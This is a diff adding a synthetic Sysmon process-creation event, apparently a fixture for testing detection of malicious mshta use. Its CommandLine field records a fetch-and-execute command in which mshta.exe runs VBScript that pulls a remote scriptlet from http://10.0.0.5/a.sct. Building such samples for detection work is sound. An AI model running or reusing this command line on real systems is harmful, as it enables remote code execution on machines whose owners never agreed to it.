@@ -1,0 +1,8 @@
+{
+  "EventID": 1,
+  "Image": "C:\\Windows\\System32\\mshta.exe",
+  "CommandLine": "mshta.exe vbscript:Close(Execute(\"GetObject(\\\"script:http://10.0.0.5/a.sct\\\")\"))",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "User": "VICTIM-PC\\analyst",
+  "_provenance": "synthetic"
+}
